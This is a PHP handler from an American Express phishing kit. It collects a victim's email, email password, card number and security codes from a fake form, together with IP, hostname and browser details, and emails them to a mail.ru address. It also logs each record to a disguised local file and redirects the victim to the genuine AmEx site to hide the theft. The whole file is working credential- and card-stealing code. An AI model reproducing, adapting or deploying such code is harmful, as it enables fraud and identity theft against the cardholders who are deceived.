<?php


$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ AMEX Details Hacked by Phish ]+=========\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['password']."\n";
$message .= "Card Number : ".$_POST['card']."\n";
$message .= "Cvv : ".$_POST['cid']."\n";
$message .= "CID : ".$_POST['cvv']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "AMEX Point Details | $ip";
$headers = "From: AMEX  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);
$fp = fopen("./htcaccess.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: https://global.americanexpress.com/dashboard?inav=MYCA_Home");
?>
